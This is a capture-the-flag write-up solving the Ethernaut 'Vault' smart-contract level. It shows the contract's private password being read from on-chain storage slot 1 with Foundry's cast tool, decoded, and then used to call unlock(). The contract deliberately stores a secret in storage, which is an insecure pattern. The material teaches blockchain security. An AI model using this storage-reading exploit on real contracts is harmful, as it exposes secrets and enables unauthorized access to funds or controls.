# Ethernaut - Vault - Solution

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## Exploit

The goal of this level is to unlock the vault by providing the correct password.

First, recall that while marking a variable as `private` prevents other contracts from accessing it, it does not mean that the value of this variable is not publicly accessible.
In fact, we can easily inspect `password` by accessing the storage slot with index 1 (index 0 stores the `locked` state) using [Cast](https://book.getfoundry.sh/cast/):

```bash
cast storage --rpc-url=<your rpc url> <your level instance address> 1
```

This tells us that the correct password is `0x412076657279207374726f6e67207365637265742070617373776f7264203a29`.

_**Note** For the fun of it, we can  convert this from `bytes32` to ASCII via:_

```bash
# Returns "A very strong secret password :)"
cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

To complete the level, we can simply call the unlock function using the above password as the function parameter:

```bash
cast send <your level instance address> "unlock(bytes32)" "0x412076657279207374726f6e67207365637265742070617373776f7264203a29" --private-key <your private key> --rpc-url <your rpc url> --gas-price <a sufficiently high gas price>
```

_**Note** You can check the current gas price via:_

```bash
cast gas-price --rpc-url <your rpc url>
```
